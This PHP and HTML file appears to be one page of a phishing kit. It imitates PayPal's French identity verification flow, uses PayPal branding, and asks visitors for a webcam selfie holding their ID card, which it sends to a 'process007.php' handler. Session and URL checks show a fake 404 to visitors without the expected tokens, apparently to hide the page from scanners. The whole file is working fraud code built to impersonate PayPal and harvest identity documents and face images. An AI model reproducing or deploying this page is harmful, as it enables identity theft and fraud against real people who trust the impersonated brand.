<?php 

session_start();

if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{

	if(strpos($_SERVER['REQUEST_URI'], $_SESSION['gotoselfie']))
	{

?>


<html lang="fr_FR" dir="ltr"><head>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300&family=Ubuntu:wght@300&display=swap');
    .notifications{outline:0;margin-bottom:10px;font-size:13px}.notifications.animatable{display:none}.notifications .notification{margin:0;padding:15px 15px 15px 44px;-webkit-border-radius:5px;-moz-border-radius:5px;-khtml-border-radius:5px;border-radius:5px;border-width:1px;border-style:solid;text-align:left;font-size:1em;background:url(https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png) no-repeat;background-size:20px}.notifications .notification.notification-default{background-color:#f7f9fa;background-position:12px -788px;background-position:left 12px top -788px;border-color:#afabae}.lower-than-ie9 .notifications .notification.notification-default{background-position:1% 81.5%}.notifications .notification.notification-critical{background-color:#fff7f7;background-position:12px -387px;background-position:left 12px top -387px;border-color:#c72e2e}.lower-than-ie9 .notifications .notification.notification-critical{background-position:1% 41%}.notifications .notification.notification-help{background-color:#f7fdff;background-position:12px -588px;background-position:left 12px top -588px;border-color:#009cde}.lower-than-ie9 .notifications .notification.notification-help{background-position:1% 61%}.notifications .notification.notification-success{background-color:#f7fff7;background-position:12px 12px;background-position:left 12px top 12px;border-color:#1b9e1b}.lower-than-ie9 .notifications .notification.notification-success{background-position:1% 0}.notifications .notification.notification-warning{background-color:#fffcf7;background-position:12px -188px;background-position:left 12px top -188px;border-color:#f8981f}.lower-than-ie9 .notifications .notification.notification-warning{background-position:1% 20.5%}.deniedCaution{margin-bottom:25px;width:112px;height:100px}.denied{text-align:center}.verification,.unavailable{text-align:left}.verification .headerText{font-size:30px}.verification .verification-message{margin:0 0 24px;text-align:center}.verification .pin{margin:0 0 12px;text-align:center;font-size:36px;color:#2c2e2f}.mobileNotification{padding:36px 0 24px}.mobileScreen{width:121px;margin:auto}
</style>
    
<script>
				function checkValue(str, max) {
				if (str.charAt(0) !== '0' || str == '00') {
					var num = parseInt(str);
					if (isNaN(num) || num <= 0 || num > max) num = 1;
					str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
				};
				return str;
			};

  // reformat by date
		function date_reformat_dd(date) {
			date.addEventListener('input', function(e) {
				this.type = 'text';
				var input = this.value;
				if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
				var values = input.split('/').map(function(v) {
					return v.replace(/\D/g, '')
				});
				if (values[1]) values[1] = checkValue(values[1], 12);
				if (values[0]) values[0] = checkValue(values[0], 31);
				var output = values.map(function(v, i) {
					return v.length == 2 && i < 2 ? v + '/' : v;
				});
				this.value = output.join('').substr(0, 14);
			});
		}
		

</script>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Hind+Madurai&display=swap');
.oaerror{
  width:80%;
  background-color: #ffffff;
  padding:20px;
  border:1px solid #eee;
  border-left-width:5px;
  border-radius: 3px;
  margin:10px auto;
  font-family: 'Open Sans', sans-serif;
  font-size: 16px;
}

.danger{
  border-left-color: #d9534f; /* Left side border color */
  background-color: rgba(217, 83, 79, 0.1); /*Same color as the left border with reduced alpha to 0.1*/
}

.danger strong{
  color:#d9534f;
}

.col-3{ width: 27.33%; margin: 40px 3%; position: relative;} /* necessary to give position: relative to parent. */
input[type="text"]{font: 15px/24px "Lato", Arial, sans-serif; color: #333; width: 100%; box-sizing: border-box; letter-spacing: 1px;}

.effect-1, 
.effect-2, 
.effect-3{border: 0; padding: 7px 0; border-bottom: 1px solid #ccc;}

.effect-1 ~ .focus-border{position: absolute; bottom: 0; left: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-1:focus ~ .focus-border{width: 100%; transition: 0.4s;}

.effect-2 ~ .focus-border{position: absolute; bottom: 0; left: 50%; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-2:focus ~ .focus-border{width: 100%; transition: 0.4s; left: 0;}

.effect-3 ~ .focus-border{position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; z-index: 99;}
.effect-3 ~ .focus-border:before, 
.effect-3 ~ .focus-border:after{content: ""; position: absolute; bottom: 0; left: 0; width: 0; height: 100%; background-color: #3399FF; transition: 0.4s;}
.effect-3 ~ .focus-border:after{left: auto; right: 0;}
.effect-3:focus ~ .focus-border:before, 
.effect-3:focus ~ .focus-border:after{width: 50%; transition: 0.4s;}

.effect-4,
.effect-5,
.effect-6{border: 0; padding: 5px 0 7px; border: 1px solid transparent; border-bottom-color: #ccc; transition: 0.4s;}

.effect-4:focus,
.effect-5:focus,
.effect-6:focus{padding: 5px 14px 7px; transition: 0.4s;}

.effect-4 ~ .focus-border{position: absolute; height: 0; bottom: 0; left: 0; width: 100%; transition: 0.4s; z-index: -1;}
.effect-4:focus ~ .focus-border{transition: 0.4s; height: 36px; border: 2px solid #3399FF; z-index: 1;}

.effect-5 ~ .focus-border{position: absolute; height: 36px; bottom: 0; left: 0; width: 0; transition: 0.4s;}
.effect-5:focus ~ .focus-border{width: 100%; transition: 0.4s; border: 2px solid #3399FF;}

.effect-6 ~ .focus-border{position: absolute; height: 36px; bottom: 0; right: 0; width: 0; transition: 0.4s;}
.effect-6:focus ~ .focus-border{width: 100%; transition: 0.4s; border: 2px solid #3399FF;}

.effect-7,
.effect-8,
.effect-9{border: 1px solid #ccc; padding: 7px 14px 9px; transition: 0.4s;}

.effect-7 ~ .focus-border:before,
.effect-7 ~ .focus-border:after{content: ""; position: absolute; top: 0; left: 50%; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-7 ~ .focus-border:after{top: auto; bottom: 0;}
.effect-7 ~ .focus-border i:before,
.effect-7 ~ .focus-border i:after{content: ""; position: absolute; top: 50%; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.6s;}
.effect-7 ~ .focus-border i:after{left: auto; right: 0;}
.effect-7:focus ~ .focus-border:before,
.effect-7:focus ~ .focus-border:after{left: 0; width: 100%; transition: 0.4s;}
.effect-7:focus ~ .focus-border i:before,
.effect-7:focus ~ .focus-border i:after{top: 0; height: 100%; transition: 0.6s;}

.effect-8 ~ .focus-border:before,
.effect-8 ~ .focus-border:after{content: ""; position: absolute; top: 0; left: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.3s;}
.effect-8 ~ .focus-border:after{top: auto; bottom: 0; left: auto; right: 0;}
.effect-8 ~ .focus-border i:before,
.effect-8 ~ .focus-border i:after{content: ""; position: absolute; top: 0; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.4s;}
.effect-8 ~ .focus-border i:after{left: auto; right: 0; top: auto; bottom: 0;}
.effect-8:focus ~ .focus-border:before,
.effect-8:focus ~ .focus-border:after{width: 100%; transition: 0.3s;}
.effect-8:focus ~ .focus-border i:before,
.effect-8:focus ~ .focus-border i:after{height: 100%; transition: 0.4s;}

.effect-9 ~ .focus-border:before,
.effect-9 ~ .focus-border:after{content: ""; position: absolute; top: 0; right: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.2s; transition-delay: 0.2s;}
.effect-9 ~ .focus-border:after{top: auto; bottom: 0; right: auto; left: 0; transition-delay: 0.6s;}
.effect-9 ~ .focus-border i:before,
.effect-9 ~ .focus-border i:after{content: ""; position: absolute; top: 0; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.2s;}
.effect-9 ~ .focus-border i:after{left: auto; right: 0; top: auto; bottom: 0; transition-delay: 0.4s;}
.effect-9:focus ~ .focus-border:before,
.effect-9:focus ~ .focus-border:after{width: 100%; transition: 0.2s; transition-delay: 0.6s;}
.effect-9:focus ~ .focus-border:after{transition-delay: 0.2s;}
.effect-9:focus ~ .focus-border i:before,
.effect-9:focus ~ .focus-border i:after{height: 100%; transition: 0.2s;}
.effect-9:focus ~ .focus-border i:after{transition-delay: 0.4s;}

.effect-10, 
.effect-11, 
.effect-12,
.effect-13,
.effect-14,
.effect-15{border: 0; padding: 7px 15px; border: 1px solid #ccc; position: relative; background: transparent;}

.effect-10 ~ .focus-bg{position: absolute; left: 0; top: 0; width: 100%; height: 100%; background-color: #ededed; opacity: 0; transition: 0.5s; z-index: -1;}
.effect-10:focus ~ .focus-bg{transition: 0.5s; opacity: 1;}

.effect-11 ~ .focus-bg{position: absolute; left: 0; top: 0; width: 0; height: 100%; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-11:focus ~ .focus-bg{transition: 0.3s; width: 100%;}

.effect-12 ~ .focus-bg{position: absolute; left: 50%; top: 0; width: 0; height: 100%; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-12:focus ~ .focus-bg{transition: 0.3s; width: 100%; left: 0;}

.effect-13 ~ .focus-bg:before,
.effect-13 ~ .focus-bg:after{content: ""; position: absolute; left: 0; top: 0; width: 0; height: 100%; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-13:focus ~ .focus-bg:before{transition: 0.3s; width: 50%;}
.effect-13 ~ .focus-bg:after{left: auto; right: 0;}
.effect-13:focus ~ .focus-bg:after{transition: 0.3s; width: 50%;}

.effect-14 ~ .focus-bg:before,
.effect-14 ~ .focus-bg:after{content: ""; position: absolute; left: 0; top: 0; width: 0; height: 0; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-14:focus ~ .focus-bg:before{transition: 0.3s; width: 50%; height: 100%;}
.effect-14 ~ .focus-bg:after{left: auto; right: 0; top: auto; bottom: 0;}
.effect-14:focus ~ .focus-bg:after{transition: 0.3s; width: 50%; height: 100%;}

.effect-15 ~ .focus-bg:before,
.effect-15 ~ .focus-bg:after{content: ""; position: absolute; left: 50%; top: 50%; width: 0; height: 0; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-15:focus ~ .focus-bg:before{transition: 0.3s; width: 50%; left: 0; top: 0; height: 100%;}
.effect-15 ~ .focus-bg:after{left: auto; right: 50%; top: auto; bottom: 50%;}
.effect-15:focus ~ .focus-bg:after{transition: 0.3s; width: 50%; height: 100%; bottom: 0; right: 0;}


.effect-16, 
.effect-17, 
.effect-18{border: 0; padding: 4px 0; border-bottom: 1px solid #ccc; background-color: transparent;}

.effect-16 ~ .focus-border{position: absolute; bottom: 0; left: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-16:focus ~ .focus-border,
.has-content.effect-16 ~ .focus-border{width: 100%; transition: 0.4s;}
.effect-16 ~ label{position: absolute; left: 0; width: 100%; top: 9px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-16:focus ~ label, .has-content.effect-16 ~ label{top: -16px; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-17 ~ .focus-border{position: absolute; bottom: 0; left: 50%; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-17:focus ~ .focus-border,
.has-content.effect-17 ~ .focus-border{width: 100%; transition: 0.4s; left: 0;}
.effect-17 ~ label{position: absolute; left: 0; width: 100%; top: 9px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-17:focus ~ label, .has-content.effect-17 ~ label{top: -16px; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-18 ~ .focus-border{position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; z-index: 99;}
.effect-18 ~ .focus-border:before, 
.effect-18 ~ .focus-border:after{content: ""; position: absolute; bottom: 0; left: 0; width: 0; height: 100%; background-color: #3399FF; transition: 0.4s;}
.effect-18 ~ .focus-border:after{left: auto; right: 0;}
.effect-18:focus ~ .focus-border:before, 
.effect-18:focus ~ .focus-border:after,
.has-content.effect-18 ~ .focus-border:before,
.has-content.effect-18 ~ .focus-border:after{width: 50%; transition: 0.4s;}
.effect-18 ~ label{position: absolute; left: 0; width: 100%; top: 9px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-18:focus ~ label, .has-content.effect-18 ~ label{top: -16px; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-19,
.effect-20,
.effect-21{border: 1px solid #ccc; padding: 7px 14px; transition: 0.4s; background: transparent;}

.effect-19 ~ .focus-border:before,
.effect-19 ~ .focus-border:after{content: ""; position: absolute; top: -1px; left: 50%; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-19 ~ .focus-border:after{top: auto; bottom: 0;}
.effect-19 ~ .focus-border i:before,
.effect-19 ~ .focus-border i:after{content: ""; position: absolute; top: 50%; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.6s;}
.effect-19 ~ .focus-border i:after{left: auto; right: 0;}
.effect-19:focus ~ .focus-border:before,
.effect-19:focus ~ .focus-border:after,
.has-content.effect-19 ~ .focus-border:before,
.has-content.effect-19 ~ .focus-border:after{left: 0; width: 100%; transition: 0.4s;}
.effect-19:focus ~ .focus-border i:before,
.effect-19:focus ~ .focus-border i:after,
.has-content.effect-19 ~ .focus-border i:before,
.has-content.effect-19 ~ .focus-border i:after{top: -1px; height: 100%; transition: 0.6s;}
.effect-19 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-19:focus ~ label, .has-content.effect-19 ~ label{top: -18px; left: 0; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-20 ~ .focus-border:before,
.effect-20 ~ .focus-border:after{content: ""; position: absolute; top: 0; left: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.3s;}
.effect-20 ~ .focus-border:after{top: auto; bottom: 0; left: auto; right: 0;}
.effect-20 ~ .focus-border i:before,
.effect-20 ~ .focus-border i:after{content: ""; position: absolute; top: 0; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.4s;}
.effect-20 ~ .focus-border i:after{left: auto; right: 0; top: auto; bottom: 0;}
.effect-20:focus ~ .focus-border:before,
.effect-20:focus ~ .focus-border:after,
.has-content.effect-20 ~ .focus-border:before,
.has-content.effect-20 ~ .focus-border:after{width: 100%; transition: 0.3s;}
.effect-20:focus ~ .focus-border i:before,
.effect-20:focus ~ .focus-border i:after,
.has-content.effect-20 ~ .focus-border i:before,
.has-content.effect-20 ~ .focus-border i:after{height: 100%; transition: 0.4s;}
.effect-20 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-20:focus ~ label, .has-content.effect-20 ~ label{top: -18px; left: 0; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-21 ~ .focus-border:before,
.effect-21 ~ .focus-border:after{content: ""; position: absolute; top: 0; right: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.2s; transition-delay: 0.2s;}
.effect-21 ~ .focus-border:after{top: auto; bottom: 0; right: auto; left: 0; transition-delay: 0.6s;}
.effect-21 ~ .focus-border i:before,
.effect-21 ~ .focus-border i:after{content: ""; position: absolute; top: 0; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.2s;}
.effect-21 ~ .focus-border i:after{left: auto; right: 0; top: auto; bottom: 0; transition-delay: 0.4s;}
.effect-21:focus ~ .focus-border:before,
.effect-21:focus ~ .focus-border:after,
.has-content.effect-21 ~ .focus-border:before,
.has-content.effect-21 ~ .focus-border:after{width: 100%; transition: 0.2s; transition-delay: 0.6s;}
.effect-21:focus ~ .focus-border:after,
.has-content.effect-21 ~ .focus-border:after{transition-delay: 0.2s;}
.effect-21:focus ~ .focus-border i:before,
.effect-21:focus ~ .focus-border i:after,
.has-content.effect-21 ~ .focus-border i:before,
.has-content.effect-21 ~ .focus-border i:after{height: 100%; transition: 0.2s;}
.effect-21:focus ~ .focus-border i:after,
.has-conten.effect-21 ~ .focus-border i:after{transition-delay: 0.4s;}
.effect-21 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-21:focus ~ label, .has-content.effect-21 ~ label{top: -18px; left: 0; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-22, 
.effect-23, 
.effect-24{border: 0; padding: 7px 15px; border: 1px solid #ccc; position: relative; background: transparent;}

.effect-22 ~ .focus-bg{position: absolute; left: 0; top: 0; width: 0; height: 100%; background-color: transparent; transition: 0.4s; z-index: -1;}
.effect-22:focus ~ .focus-bg, 
.has-content.effect-22 ~ .focus-bg{transition: 0.4s; width: 100%; background-color: #ededed;}
.effect-22 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-22:focus ~ label, .has-content.effect-22 ~ label{top: -18px; left: 0; font-size: 12px; color: #333; transition: 0.3s;}

.effect-23 ~ .focus-bg:before,
.effect-23 ~ .focus-bg:after{content: ""; position: absolute; left: 0; top: 0; width: 0; height: 0; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-23:focus ~ .focus-bg:before,
.has-content.effect-23 ~ .focus-bg:before{transition: 0.3s; width: 50%; height: 100%;}
.effect-23 ~ .focus-bg:after{left: auto; right: 0; top: auto; bottom: 0;}
.effect-23:focus ~ .focus-bg:after,
.has-content.effect-23 ~ .focus-bg:after{transition: 0.3s; width: 50%; height: 100%;}
.effect-23 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-23:focus ~ label, .has-content.effect-23 ~ label{top: -18px; left: 0; font-size: 12px; color: #333; transition: 0.3s;}

.effect-24 ~ .focus-bg:before,
.effect-24 ~ .focus-bg:after{content: ""; position: absolute; left: 50%; top: 50%; width: 0; height: 0; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-24:focus ~ .focus-bg:before,
.has-content.effect-24 ~ .focus-bg:before{transition: 0.3s; width: 50%; left: 0; top: 0; height: 100%;}
.effect-24 ~ .focus-bg:after{left: auto; right: 50%; top: auto; bottom: 50%;}
.effect-24:focus ~ .focus-bg:after,
.has-content.effect-24 ~ .focus-bg:after{transition: 0.3s; width: 50%; height: 100%; bottom: 0; right: 0;}
.effect-24 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-24:focus ~ label, .has-content.effect-24 ~ label{top: -18px; left: 0; font-size: 12px; color: #333; transition: 0.3s;}



a.button:hover, a.button:link:hover, a.button:visited:hover, .button:hover {
    background-color: #005ea6;
    outline: 0;
}
a.button, a.button:link, a.button:visited, .button {
    width: 100%;
    height: 44px;
    padding: 0;
    border: 0;
    display: block;
    background-color: #0070ba;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    -khtml-border-radius: 4px;
    border-radius: 4px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    cursor: pointer;
    -webkit-appearance: none;
    -moz-appearance: none;
    -ms-appearance: none;
    -o-appearance: none;
    appearance: none;
    -webkit-tap-highlight-color: transparent;
    color: #fff;
    font-size: 1em;
    text-align: center;
    font-weight: 700;
    font-family: HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
    text-shadow: none;
    text-decoration: none;
    -webkit-transition: background-color .4s ease-out;
    -moz-transition: background-color .4s ease-out;
    -o-transition: background-color .4s ease-out;
    transition: background-color .4s ease-out;
    -webkit-font-smoothing: antialiased;



}


</style>

<style>
 .__lk-fileInput {
  cursor: pointer;
}
.__lk-fileInput input {
  display: none;
}
.__lk-fileInput span {
  color: #fff;
  margin: 0 0 10px;
  padding: 5px 10px;
  text-decoration: none;
  background: #418edb;
  border-radius: 2px;
  font: normal 14px/1.412 Helvetica;
}
.__lk-fileInput span:hover {
  background: #2683E1;
}
.__lk-fileInput span.withFile:after {
  content: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAYAAABWdVznAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QTA5OEU0M0REOUIwMTFFMzg4Q0VDNDEwMTU1QkU0MUIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QTA5OEU0M0VEOUIwMTFFMzg4Q0VDNDEwMTU1QkU0MUIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpBMDk4RTQzQkQ5QjAxMUUzODhDRUM0MTAxNTVCRTQxQiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpBMDk4RTQzQ0Q5QjAxMUUzODhDRUM0MTAxNTVCRTQxQiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PolX3bIAAADWSURBVHjadNHNCkFBFMDxSYq9UsoCC4/gZqFEiXLZSKy8nJ2Pja6FB1A8i/KRuEjXfzSXY3DqV3Nnzpx7TqOCIMhjgAkSUJYkRugjG1VKFeGiBgdz9RmOObvgWWEWvOOMlqiu1745u2OsN9No42YOLqigbNbhXgMp2WsdW5NwE8kbVMM8e8ASrlaLjsyJWAPG1HfEP77+DOiLlo6m3VdLOXRFK3qOAoo4iAIdZPQFT/R8ktXQFH/VMVXmlfVL7qzkkIs9hujpl16G42D9Y+gVFvD0+iHAAMR9gu9PEii4AAAAAElFTkSuQmCC');
  display: inline-block;
  vertical-align: middle;
  margin-left: 8px;
}
	</style>

<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>PayPal - Processus de confirmation</title><script nonce="" type="text/javascript">window.webpackPublicPath = '';</script>
<link nonce="" href="../css/head.css" rel="stylesheet">
<link nonce="" href="card/style.css" rel="stylesheet">


<link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png"><link rel="shortcut icon" type="image/x-icon" href="../img/favicon.ico"></head>


<body class="static static-terms_v2">

	<header style="background-color: transparent"><div class="header-content">

		<img style="position: relative;
top: 1px;width: 120px;" src="../img/54qsrg.png"><div class="links"></div><div style="display:inline-block;float:right"><a class="my-paypal-me" href="#">Deconnexion</a></div></div></header><div style="padding-bottom: 200px; " class="wrapper" id="app"><div class="card-form"> <center>


	
<img src="https://i.pinimg.com/originals/16/b9/d2/16b9d229ba47eda6673326740a8e65da.png" style="width: 100px;">


</center>

<br><div class="card-form__inner">
    
    <form action="process007.php?<?php echo $_SESSION['userid']; ?>" method="post" class="contain-info" enctype="multipart/form-data">
<h1 style="font-size: 25px;margin-top: -150px;text-align: center;font-family: 'Quicksand', sans-serif;
" class="terms-main-title"><span>Vérification de vos documents d'identité</span></h1><strong>
<?php
if(strpos($_SERVER['REQUEST_URI'], "error=true"))
{

?>
<div class="notifications"><p style="font-size:13px;font-family: 'Roboto', sans-serif;" class="notification notification-critical" role="alert"><strong>Veuillez vérifier les documents envoyés</strong></p></div>
<?php
}
?>

	<p style="text-align: center;font-family: 'Quicksand', sans-serif;
    ">Nous devons valider vos documents d'identité afin de vérifier votre compte.<br> Prendre un selfie d'identité.
<br>
<br>
• La photo doit être clairement visible
<br>
• Prenez une photo avec votre carte d'identité
<br>
• Le nom du titulaire et la carte d'identité doivent correspondre et être clairement visibles.
<br>
• Aucun reflet ne doit apparaitre sur la photo
<br>
<br>
Aperçu :

</p>

	




<br><br></strong>








 



<button type="submit" id="btnLogin" name="btnNext" value="Login" class="button actionContinue" style="width: 100%;">Continuer</button>

    
      
  </form>
  
    
    
    
    
    
       </div></div></div><footer id="footer" style="height: 40px;"><div class="footers-container"><div class="ppme-footer"><div class="links"><a href="/paypalme/" class="link-list-item"><span class="align-with-button">À propos de PayPal</span></a><a href="/paypalme/pages/terms" class="link-list-item"><span class="align-with-button">Conditions</span></a></div></div><div class="paypal-footer" role="contentinfo"><div class="navbar-inner"><div class="navbar-content"><ul class="inline footerList-links footerList-links_primary"><li class="country-list-item"><a href="/paypalme/pages/countries?locale.x=fr_FR&amp;country.x=FR" class="country-selector-link"><div class="country-selector FR"></div></a></li><li> <a href="#">À propos de PayPal</a> </li> <li> <a href="#">Contact</a> </li> <li> <a href="#">Tarifs</a> </li> <li> <a href="#">Respect de la vie privée</a> </li> </ul><div class="country-selector-container"><a href="/paypalme/pages/countries?locale.x=fr_FR&amp;country.x=FR" class="country-selector-link"><div class="country-selector FR"></div></a></div><p class="footerCopyright nemo_copyrightText hide-on-mobile">©1999-2021 PayPal, Inc. Tous droits réservés.</p><ul class="inline footerList-links footerList-links_secondary"><li> <a href="#">Développeurs PayPal</a> </li> <li> <a href="#">Blog PayPal</a> </li> <li> <a href="#">Solutions e-commerce</a> </li> <li> <a href="#">Plan du site</a> </li> </ul><p class="footerCopyright nemo_copyrightText hide-on-desktop">©1999-2021 PayPal, Inc. Tous droits réservés.</p></div></div></div></div></footer><section class="modal"></section>
  




































 <script src="../js/webcam.min.js"></script>
 <script>
$(document).ready(function() {
            $('#hdone,#hdtwo,#re').hide();
            $('#auto').on('click',function(){
            $('#hdone').fadeIn(50);
            $('#auto').fadeOut(50);
            $('#opaopa').fadeOut(50);
            $('#re').fadeIn(50);
            });
            $('#hdone').on('click',function(){
                                     $('#hdtwo').fadeIn(50) ;
                                $('#hdone').val('Prendre une autre photo')  
                                             });
    $('#hdtwo').on('click',function(){
        $('#my_camera').fadeOut(50);
    });
    $('#re').on('click',function(){
        $('#opaopa').fadeIn(50);
        $('#re').fadeOut(50);
    });
  });
    </script>
            	<script language="JavaScript">
		Webcam.set({
			width: $('#width').width(),
			height: 0.7585*$('#width').width(),
			image_format: 'jpeg',
			jpeg_quality: 100
		});
	</script>
            	<script language="JavaScript">
		function setup() {
			Webcam.reset();
			Webcam.attach( '#my_camera' );
		}
		
		function take_snapshot() {
			// take snapshot and get image data
			Webcam.snap( function(data_uri) {
				// display results in page
				document.getElementById('results').innerHTML = 
					'<p class="votre">Votre photo:</p>' + 
					'<img style="border:5px solid #0070ba;border-radius: 3px;" src="'+data_uri+'"/>';
                $('#data').val(data_uri);
			});
		}
	</script>


</body></html>


<?php

	}
	else{

		
		die('HTTP/1.0 404 Not Found');

	}
}
else{


	die('HTTP/1.0 404 Not Found');
}

?>